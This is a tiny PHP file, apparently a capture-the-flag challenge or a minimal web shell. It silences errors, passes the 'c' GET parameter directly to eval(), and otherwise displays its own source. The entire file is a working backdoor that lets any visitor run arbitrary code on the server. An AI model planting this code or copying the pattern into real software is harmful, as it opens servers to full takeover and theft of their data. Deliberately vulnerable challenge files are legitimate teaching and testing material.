<?php
error_reporting(0);
if(isset($_GET['c'])) {
  eval($_GET['c']);
}else {
  highlight_file(__FILE__);
}
